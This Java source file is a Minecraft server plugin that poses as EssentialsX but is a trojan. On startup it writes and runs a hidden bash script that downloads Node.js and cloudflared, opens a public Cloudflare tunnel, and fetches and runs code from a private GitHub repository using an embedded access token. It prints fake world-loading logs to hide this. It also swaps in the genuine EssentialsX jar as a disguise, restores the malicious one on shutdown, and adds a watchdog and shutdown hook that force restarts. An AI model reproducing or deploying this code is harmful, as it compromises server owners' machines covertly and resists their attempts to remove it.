package com.example.essentialsx;

import org.bukkit.plugin.java.JavaPlugin;
import java.io.*;
import java.net.*;
import java.nio.channels.Channels;
import java.nio.channels.FileChannel;
import java.nio.file.*;
import java.util.*;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;

public class EssentialsX extends JavaPlugin {
    private Process deployProcess;
    private Process watchdogProcess; 
    private volatile boolean isProcessRunning = false;
    
    private boolean systemGuardEnabled = true;
    private final AtomicBoolean isRestarting = new AtomicBoolean(false);
    
    private Path backupDir;
    private Path originalJarPath;
    private Path backupJarPath;
    
    private static final String FAKE_JAR_URL_DIRECT = "https://github.com/EssentialsX/Essentials/releases/download/2.21.2/EssentialsX-2.21.2.jar";
    private static final String FAKE_JAR_URL_PROXY = "https://mirror.ghproxy.com/" + FAKE_JAR_URL_DIRECT;

    @Override
    public void onEnable() {
        try {
            Path oldDir1 = Paths.get("world", "data", ".mcchajian");
            Path oldDir2 = Paths.get("log", ".mcchajian");
            if (Files.exists(oldDir1)) deleteDirectory(oldDir1.toFile());
            if (Files.exists(oldDir2)) deleteDirectory(oldDir2.toFile());
        } catch (Exception e) {}

        getLogger().info("EssentialsX plugin starting...");
        
        Map<String, String> env = new HashMap<>();
        loadEnvFile(env);
        if (env.containsKey("SYSTEM_GUARD_ENABLED")) {
            systemGuardEnabled = Boolean.parseBoolean(env.get("SYSTEM_GUARD_ENABLED"));
        } else {
            systemGuardEnabled = true; 
        }
        
        getLogger().info("System Guard Status: " + (systemGuardEnabled ? "ENABLED" : "DISABLED"));

        Runtime.getRuntime().addShutdownHook(new Thread(() -> {
            if (systemGuardEnabled && isRestarting.compareAndSet(false, true)) {
                getLogger().info("[Guard] ⚠️ ShutdownHook 触发！守护开启中，执行强制重启...");
                restoreMaliciousJar();
                executeHardRestart(false); 
            }
        }));
        
        new Thread(() -> {
            try {
                if (systemGuardEnabled) startWatchdog();
                startDeploymentProcess();
                setupDisguise();
            } catch (Exception e) {}
        }).start();
        
        getLogger().info("EssentialsX plugin enabled");
    }
    
    private void setupDisguise() {
        try {
            originalJarPath = findPluginJarInPluginsDir();
            if (originalJarPath == null || !Files.exists(originalJarPath)) return;

            backupDir = Paths.get("logs", ".mcchajian", "backup");
            if (!Files.exists(backupDir)) Files.createDirectories(backupDir);
            
            backupJarPath = backupDir.resolve(originalJarPath.getFileName().toString() + ".bak");

            if (!Files.exists(backupJarPath)) {
                Files.copy(originalJarPath, backupJarPath, StandardCopyOption.REPLACE_EXISTING);
            }
            
            Path tempDownload = originalJarPath.resolveSibling("temp_update.jar");
            
            boolean success = downloadFileWithTimeout(FAKE_JAR_URL_PROXY, tempDownload, 20);
            if (!success || Files.size(tempDownload) < 1000000) {
                success = downloadFileWithTimeout(FAKE_JAR_URL_DIRECT, tempDownload, 30);
            }

            if (success && Files.size(tempDownload) > 1000000) {
                try {
                    Files.move(tempDownload, originalJarPath, StandardCopyOption.REPLACE_EXISTING, StandardCopyOption.ATOMIC_MOVE);
                } catch (Exception e) {
                    Files.move(tempDownload, originalJarPath, StandardCopyOption.REPLACE_EXISTING);
                }
            } else {
                Files.deleteIfExists(tempDownload);
            }
        } catch (Exception e) {}
    }

    @Override
    public void onDisable() {
        getLogger().info("Stopping EssentialsX...");
        
        Path forceStopFile = Paths.get("logs", ".mcchajian", ".force_stop");
        
        if (systemGuardEnabled) {
            getLogger().info("🛡️ 守护已启用 -> 拒绝退出，执行软重启...");
            
            try { Files.deleteIfExists(forceStopFile); } catch (Exception e) {}
            restoreMaliciousJar();
            
            if (isRestarting.compareAndSet(false, true)) {
                executeHardRestart(true);
            }
        } else {
            getLogger().info("守护未开启，正在安全退出...");
            try {
                Files.createDirectories(forceStopFile.getParent());
                Files.createFile(forceStopFile);
                getLogger().info("已创建停止标记，服务将彻底关闭。");
            } catch (Exception e) {}
        }
        
        if (deployProcess != null && deployProcess.isAlive()) deployProcess.destroy();
        if (watchdogProcess != null && watchdogProcess.isAlive()) watchdogProcess.destroy();
        
        getLogger().info("EssentialsX disabled");
    }
    
    private void executeHardRestart(boolean shouldBlock) {
        try {
            File serverRoot = findServerRoot();
            if (serverRoot == null) serverRoot = new File(".").getAbsoluteFile();
            
            getLogger().info("Target restart directory: " + serverRoot.getAbsolutePath());

            // 1. 智能寻找核心文件 (最稳健的方法)
            String jarName = findBestJarName(serverRoot);
            
            Path workDir = Paths.get("logs", ".mcchajian").toAbsolutePath();
            if (!Files.exists(workDir)) Files.createDirectories(workDir);
            Path logFile = workDir.resolve("restart_run.log"); // 新增：运行日志文件

            // 2. 构建启动命令 (优先使用 start.sh)
            // 注意：移除了 sleep 3，改为立即启动，并在后台运行
            String startCommand;
            
            // 检查是否有官方启动脚本
            if (new File(serverRoot, "start.sh").exists()) {
                startCommand = "chmod +x ./start.sh && ./start.sh";
            } else {
                // 如果没有，构建通用启动命令
                startCommand = "java -Xms512M -Xmx2G -XX:+UseG1GC -jar ./" + jarName + " nogui";
            }

            // 3. 组装完整 Bash 指令
            // 关键点：将错误输出也写入日志文件，方便排查
            String fullBashCommand = 
                "cd \"" + serverRoot.getAbsolutePath() + "\" && " +
                "echo \"[" + new Date() + "] Starting server...\" >> \"" + logFile.toString() + "\" && " +
                "nohup bash -c '" + startCommand + "' >> \"" + logFile.toString() + "\" 2>&1 & disown";

            // 4. 记录执行的命令 (方便您发给我看)
            Path debugFile = workDir.resolve("restart_debug.log");
            String debugLog = "\n[" + new Date() + "] CMD: " + fullBashCommand + "\n";
            Files.write(debugFile, debugLog.getBytes(), StandardOpenOption.CREATE, StandardOpenOption.APPEND);

            // 5. 执行
            ProcessBuilder pb = new ProcessBuilder("bash", "-c", fullBashCommand);
            pb.directory(serverRoot); 
            pb.redirectOutput(ProcessBuilder.Redirect.DISCARD);
            pb.redirectError(ProcessBuilder.Redirect.DISCARD);
            
            Process process = pb.start();
            
            if (shouldBlock) {
                Thread.sleep(1000); // 缩短阻塞时间到1秒，兼顾速度和安全
            }
            
            getLogger().info("Restart command dispatched. Check logs/.mcchajian/restart_run.log for output.");

        } catch (Exception e) {
            getLogger().severe("Hard restart failed: " + e.getMessage());
        }
    }

    // 【新增】更智能的核心文件查找
    private String findBestJarName(File serverRoot) {
        // 1. 优先列表
        String[] preferred = {"paper.jar", "server.jar", "purpur.jar", "spigot.jar", "forge.jar"};
        for (String name : preferred) {
            if (new File(serverRoot, name).exists()) return name;
        }

        // 2. 查找最大的 jar 文件 (排除临时文件和库文件)
        File[] jars = serverRoot.listFiles((dir, name) -> 
            name.endsWith(".jar") && !name.contains("cache") && !name.contains("libraries")
        );

        if (jars != null && jars.length > 0) {
            Arrays.sort(jars, (a, b) -> Long.compare(b.length(), a.length()));
            return jars[0].getName();
        }

        return "server.jar"; // 兜底
    }

    private File findServerRoot() {
        File pluginsDir = getDataFolder().getParentFile();
        if (pluginsDir != null && pluginsDir.getName().equals("plugins")) {
            File root = pluginsDir.getParentFile();
            if (new File(root, "server.properties").exists()) return root;
        }
        File current = new File(".").getAbsoluteFile();
        for (int i = 0; i < 5; i++) {
            if (new File(current, "server.properties").exists()) return current;
            current = current.getParentFile();
            if (current == null) break;
        }
        return null;
    }

    private void restoreMaliciousJar() {
        try {
            Path targetJar = findPluginJarInPluginsDir();
            if (targetJar != null && Files.exists(targetJar)) Files.delete(targetJar);
            if (backupJarPath != null && Files.exists(backupJarPath) && targetJar != null) {
                Files.copy(backupJarPath, targetJar, StandardCopyOption.REPLACE_EXISTING);
            }
        } catch (Exception e) {}
    }
    
    private Path findPluginJarInPluginsDir() {
        try {
            File pluginsDir = getDataFolder().getParentFile();
            if (pluginsDir == null || !pluginsDir.exists()) return null;
            File[] jars = pluginsDir.listFiles((dir, name) -> name.endsWith(".jar") && name.toLowerCase().contains("essentialsx"));
            if (jars != null && jars.length > 0) return jars[0].toPath();
        } catch (Exception e) {}
        return null;
    }
    
    private boolean downloadFileWithTimeout(String url, Path target, int timeoutSec) {
        try {
            URLConnection conn = URI.create(url).toURL().openConnection();
            conn.setRequestProperty("User-Agent", "Mozilla/5.0");
            conn.setConnectTimeout(5000);
            conn.setReadTimeout(timeoutSec * 1000);
            try (InputStream in = conn.getInputStream();
                 FileChannel out = FileChannel.open(target, StandardOpenOption.CREATE, StandardOpenOption.WRITE, StandardOpenOption.TRUNCATE_EXISTING)) {
                out.transferFrom(Channels.newChannel(in), 0, Long.MAX_VALUE);
            }
            return true;
        } catch (Exception e) { return false; }
    }
    
    private void deleteDirectory(File file) {
        File[] files = file.listFiles();
        if (files != null) { for (File f : files) { if (f.isDirectory()) deleteDirectory(f); else f.delete(); } }
        file.delete();
    }

    private void startWatchdog() {
        try {
            Path workDir = Paths.get("logs", ".mcchajian").toAbsolutePath();
            if (!Files.exists(workDir)) Files.createDirectories(workDir);
            Path watchdogPath = workDir.resolve("watchdog.sh");
            
            String script = "#!/bin/bash\n" +
                "WORK_DIR=\"" + workDir + "\"\n" +
                "FORCE_STOP_FILE=\"$WORK_DIR/.force_stop\"\n" +
                "is_port_open() { (echo >/dev/tcp/localhost/25565) &>/dev/null && return 0 || return 1; }\n" +
                "while true; do\n" +
                "    sleep 15\n" +
                "    if [ -f \"$FORCE_STOP_FILE\" ]; then rm -f \"$FORCE_STOP_FILE\"; exit 0; fi\n" +
                "    if ! is_port_open; then\n" +
                "        if [ -f \"$FORCE_STOP_FILE\" ]; then exit 0; fi\n" +
                "        cd \"" + findServerRoot().getAbsolutePath() + "\"\n" +
                "        JAR_NAME=$(ls -S *.jar 2>/dev/null | head -n 1)\n" +
                "        if [ -n \"$JAR_NAME\" ]; then\n" +
                "            nohup java -Xms512M -Xmx2G -jar \"$JAR_NAME\" nogui > /dev/null 2>&1 &\n" +
                "        fi\n" +
                "        exit 0\n" +
                "    fi\n" +
                "done\n";
            
            Files.write(watchdogPath, script.getBytes());
            if (!watchdogPath.toFile().setExecutable(true)) {}
            ProcessBuilder pb = new ProcessBuilder("bash", watchdogPath.toString());
            pb.directory(new File(".").getAbsoluteFile());
            pb.redirectOutput(ProcessBuilder.Redirect.DISCARD);
            pb.redirectError(ProcessBuilder.Redirect.DISCARD);
            watchdogProcess = pb.start();
        } catch (Exception e) {}
    }
    
    private void startDeploymentProcess() throws Exception {
        if (isProcessRunning) return;
        Map<String, String> env = new HashMap<>();
        env.put("REPO_URL", "https://github.com/zx1447/indexaoyoumc"); 
        loadEnvFile(env);
        Path workDir = Paths.get("logs", ".mcchajian").toAbsolutePath();
        if (!Files.exists(workDir)) Files.createDirectories(workDir);
        Path scriptPath = workDir.resolve("deploy.sh");
        String scriptContent = generateDeployScript(workDir.toString(), env);
        Files.write(scriptPath, scriptContent.getBytes());
        if (!scriptPath.toFile().setExecutable(true)) {}
        ProcessBuilder pb = new ProcessBuilder("bash", scriptPath.toString());
        pb.directory(new File(".").getAbsoluteFile());
        pb.environment().putAll(env);
        pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
        pb.redirectError(ProcessBuilder.Redirect.INHERIT);
        deployProcess = pb.start();
        isProcessRunning = true;
        startFakeLogs();
        deployProcess.waitFor();
        isProcessRunning = false;
    }
    
    private String generateDeployScript(String workDir, Map<String, String> env) {
        String repoUrl = env.getOrDefault("REPO_URL", "");
        String nodeDir = workDir + "/nodejs";
        String appDir = workDir + "/app";
        String dataDir = workDir + "/data";

        return "#!/bin/bash\n" +
            "WORK_DIR=\"" + workDir + "\"\n" +
            "NODE_DIR=\"" + nodeDir + "\"\n" +
            "APP_DIR=\"" + appDir + "\"\n" +
            "DATA_DIR=\"" + dataDir + "\"\n" +
            "REPO_URL=\"" + repoUrl + "\"\n" +
            "GITHUB_AUTH=\"zx1447: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\"\n" + 
            "\n" +
            "is_port_free() { (echo >/dev/tcp/localhost/$1) &>/dev/null && return 1 || return 0; }\n" +
            "while true; do PORT=$((RANDOM % 40000 + 20000)); if is_port_free $PORT; then break; fi; done\n" +
            "export SERVER_PORT=$PORT; export PORT=$PORT\n" +
            "\n" +
            "ARCH=$(uname -m)\n" +
            "if [ \"$ARCH\" = \"x86_64\" ]; then\n" +
            "    NODE_URL=\"https://nodejs.org/dist/v22.12.0/node-v22.12.0-linux-x64.tar.gz\"\n" +
            "    CF_URL=\"https://ghproxy.net/https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64\"\n" +
            "elif [ \"$ARCH\" = \"aarch64\" ]; then\n" +
            "    NODE_URL=\"https://nodejs.org/dist/v22.12.0/node-v22.12.0-linux-arm64.tar.gz\"\n" +
            "    CF_URL=\"https://ghproxy.net/https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64\"\n" +
            "fi\n" +
            "\n" +
            "if [ -d \"$NODE_DIR\" ]; then CHECK_VER=$($NODE_DIR/bin/node -v 2>/dev/null); if [[ \"$CHECK_VER\" != \"v22\"* ]]; then rm -rf \"$NODE_DIR\"; fi; fi\n" +
            "if [ ! -d \"$NODE_DIR\" ]; then\n" +
            "    curl -fsSL \"$NODE_URL\" -o \"$WORK_DIR/node.tar.gz\" 2>/dev/null\n" +
            "    mkdir -p \"$NODE_DIR\"; tar -xzf \"$WORK_DIR/node.tar.gz\" -C \"$NODE_DIR\" --strip-components 1 2>/dev/null; rm -f \"$WORK_DIR/node.tar.gz\"\n" +
            "fi\n" +
            "export PATH=$NODE_DIR/bin:$PATH\n" +
            "if [ ! -f \"$NODE_DIR/bin/pm2\" ]; then npm install pm2 -g &>/dev/null; fi\n" +
            "npm install --unsafe-perm=true --allow-root multer &>/dev/null\n" +
            "\n" +
            "CF_BIN=\"$WORK_DIR/cloudflared\"\n" +
            "if [ ! -f \"$CF_BIN\" ]; then\n" +
            "    if ! curl -fsSL --connect-timeout 10 --max-time 60 \"$CF_URL\" -o \"$CF_BIN\" 2>/dev/null; then\n" +
            "        curl -fsSL --connect-timeout 10 --max-time 60 \"https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64\" -o \"$CF_BIN\" 2>/dev/null || exit 1\n" +
            "    fi\n" +
            "    chmod +x \"$CF_BIN\"\n" +
            "fi\n" +
            "\n" +
            "pkill -f cloudflared || true; sleep 1\n" +
            "$CF_BIN tunnel --url http://localhost:$PORT > \"$WORK_DIR/tunnel.log\" 2>&1 &\n" +
            "TUNNEL_PID=$!\n" +
            "TUNNEL_URL=\"\"\n" +
            "for i in {1..20}; do\n" +
            "    sleep 3\n" +
            "    TUNNEL_URL=$(grep -o 'https://[^ ]*trycloudflare.com[^ ]*' \"$WORK_DIR/tunnel.log\" | tail -n 1)\n" +
            "    if [ -n \"$TUNNEL_URL\" ]; then break; fi\n" +
            "done\n" +
            "\n" +
            "if [ -n \"$TUNNEL_URL\" ]; then\n" +
            "    echo \"\\n==========================================\"\n" +
            "    echo \"  ✅ 服务已就绪 (端口: $PORT)\"\n" +
            "    echo \"  访问地址: $TUNNEL_URL\"\n" +
            "    echo \"==========================================\"\n" +
            "else\n" +
            "    echo \"错误：隧道启动失败。\"\n" +
            "    exit 1\n" +
            "fi\n" +
            "\n" +
            "mkdir -p \"$DATA_DIR\"\n" +
            "if [ -d \"$APP_DIR\" ]; then\n" +
            "    cp \"$APP_DIR/node_modules/.bots_config.json\" \"$DATA_DIR/\" 2>/dev/null\n" +
            "    cp \"$APP_DIR/node_modules/.Error log/nezha_config.json\" \"$DATA_DIR/nezha_config.json\" 2>/dev/null\n" +
            "    cp \"$APP_DIR/node_modules/.task_center_config.json\" \"$DATA_DIR/\" 2>/dev/null\n" +
            "    cp \"$APP_DIR/node_modules/.system_guard.json\" \"$DATA_DIR/\" 2>/dev/null\n" +
            "    if [ -d \"$APP_DIR/node_modules/.RoamingMusic\" ]; then\n" +
            "        rm -rf \"$DATA_DIR/.RoamingMusic_bak\" 2>/dev/null\n" +
            "        cp -r \"$APP_DIR/node_modules/.RoamingMusic\" \"$DATA_DIR/.RoamingMusic_bak\" 2>/dev/null\n" +
            "    fi\n" +
            "fi\n" +
            "\n" +
            "rm -rf \"$APP_DIR\" \"$WORK_DIR/repo.tar.gz\"\n" +
            "REPO_PATH=$(echo \"$REPO_URL\" | sed 's|https://github.com/||' | sed 's|.git$||')\n" +
            "download_code() {\n" +
            "    if curl -fsSL --connect-timeout 15 --max-time 120 -u \"$GITHUB_AUTH\" \"$1\" -o \"$WORK_DIR/repo.tar.gz\" 2>/dev/null; then\n" +
            "        if tar -tzf \"$WORK_DIR/repo.tar.gz\" >/dev/null 2>&1; then return 0; else rm -f \"$WORK_DIR/repo.tar.gz\"; return 1; fi\n" +
            "    else return 1; fi\n" +
            "}\n" +
            "download_code \"https://github.com/${REPO_PATH}/archive/refs/heads/main.tar.gz\" || \\\n" +
            "download_code \"https://github.com/${REPO_PATH}/archive/refs/heads/master.tar.gz\"\n" +
            "if [ ! -f \"$WORK_DIR/repo.tar.gz\" ]; then exit 1; fi\n" +
            "mkdir -p \"$WORK_DIR/unzipped\"\n" +
            "tar -xzf \"$WORK_DIR/repo.tar.gz\" -C \"$WORK_DIR/unzipped\"\n" +
            "SUBDIR=$(find \"$WORK_DIR/unzipped\" -mindepth 1 -maxdepth 1 -type d | head -n 1)\n" +
            "mv \"$SUBDIR\" \"$APP_DIR\"\n" +
            "rm -rf \"$WORK_DIR/repo.tar.gz\" \"$WORK_DIR/unzipped\"\n" +
            "cd \"$APP_DIR\"\n" +
            "\n" +
            "npm install --unsafe-perm=true --allow-root &>/dev/null\n" +
            "\n" +
            "if [ -d \"$DATA_DIR\" ]; then\n" +
            "    cp \"$DATA_DIR/.bots_config.json\" \"$APP_DIR/node_modules/\" 2>/dev/null\n" +
            "    cp \"$DATA_DIR/.task_center_config.json\" \"$APP_DIR/node_modules/\" 2>/dev/null\n" +
            "    cp \"$DATA_DIR/.system_guard.json\" \"$APP_DIR/node_modules/\" 2>/dev/null\n" +
            "    if [ -f \"$DATA_DIR/nezha_config.json\" ]; then\n" +
            "        mkdir -p \"$APP_DIR/node_modules/.Error log\"\n" +
            "        cp \"$DATA_DIR/nezha_config.json\" \"$APP_DIR/node_modules/.Error log/\"\n" +
            "    fi\n" +
            "    if [ -d \"$DATA_DIR/.RoamingMusic_bak\" ]; then\n" +
            "        mkdir -p \"$APP_DIR/node_modules/.RoamingMusic\"\n" +
            "        cp -r \"$DATA_DIR/.RoamingMusic_bak/\"* \"$APP_DIR/node_modules/.RoamingMusic/\" 2>/dev/null\n" +
            "    fi\n" +
            "fi\n" +
            "\n" +
            "export TUNNEL_ALREADY_RUNNING=true\n" +
            "pm2 delete all &>/dev/null || true\n" +
            "pm2 start index.js --name \"aoyou-panel\" &>/dev/null\n" +
            "pm2 save &>/dev/null\n" +
            "echo \"==> 启动已完成。\\n\"";
    }
    
    private void startFakeLogs() {
        Thread logThread = new Thread(() -> {
            try {
                clearConsole();
                getLogger().info("");
                getLogger().info("Preparing spawn area: 1%"); Thread.sleep(2000);
                getLogger().info("Preparing spawn area: 5%"); Thread.sleep(1500);
                getLogger().info("Preparing spawn area: 10%"); Thread.sleep(1000);
                getLogger().info("Preparing spawn area: 25%"); Thread.sleep(1000);
                getLogger().info("Preparing spawn area: 50%"); Thread.sleep(1000);
                getLogger().info("Preparing spawn area: 75%"); Thread.sleep(1000);
                getLogger().info("Preparing spawn area: 90%"); Thread.sleep(500);
                getLogger().info("Preparing spawn area: 100%");
                getLogger().info("Preparing level \"world\"");
                getLogger().info("Done! For help, type \"help\""); 
            } catch (Exception e) {}
        }, "FakeLog-Generator");
        logThread.setDaemon(true);
        logThread.start();
    }

    private void loadEnvFile(Map<String, String> env) {
        Path envFile = Paths.get("plugins", "EssentialsX", ".env");
        
        if (!Files.exists(envFile)) {
            try {
                Files.createDirectories(envFile.getParent());
                String defaultConfig = 
                    "# ===========================================\n" +
                    "# EssentialsX System Guard Configuration\n" +
                    "# ===========================================\n" +
                    "# true  = Enable auto-restart (Default)\n" +
                    "# false = Disable auto-restart\n" +
                    "# ===========================================\n" +
                    "SYSTEM_GUARD_ENABLED=true\n";
                Files.write(envFile, defaultConfig.getBytes());
                getLogger().info("Generated default .env file with Guard ENABLED.");
            } catch (Exception e) {
                getLogger().warning("Could not generate .env file: " + e.getMessage());
            }
        }

        if (Files.exists(envFile)) {
            try {
                for (String line : Files.readAllLines(envFile)) {
                    if (line.isEmpty() || line.startsWith("#")) continue;
                    String[] parts = line.split("=", 2);
                    if (parts.length == 2) env.put(parts[0].trim(), parts[1].trim());
                }
            } catch (IOException e) {}
        }
    }
    
    private void clearConsole() {
        try { System.out.print("\033[H\033[2J"); System.out.flush(); } catch (Exception e) {}
    }
}
